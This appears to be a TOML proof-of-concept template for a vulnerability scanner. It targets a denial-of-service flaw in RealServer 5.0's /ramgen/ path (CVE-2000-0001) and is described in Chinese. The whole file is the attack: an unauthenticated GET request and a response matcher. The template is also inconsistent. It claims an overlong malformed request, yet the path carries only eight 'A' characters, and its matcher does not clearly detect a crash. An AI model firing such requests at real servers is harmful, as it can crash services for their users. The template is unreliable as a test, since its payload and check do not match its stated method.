[info]
author = "AVE"
description = "向 RealServer 5.0 的 /ramgen/ 路径发送超长畸形请求，可导致 RealServer 服务进程崩溃，造成拒绝服务。攻击者无需认证，发送单个 HTTP GET 请求即可触发。"
id = "POC-AVE-2000-0003"
name = "RealNetworks RealServer 5.0 ramgen 拒绝服务 PoC"
severity = "medium"
tags = [
    "cve-2000-0001",
    "dos",
    "realserver",
]
vuln_id = [
    "CVE-2000-0001",
    "AVE-2000-0003",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ramgen/AAAAAAAA"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = [
    "404",
    "500",
    "Service Unavailable",
]
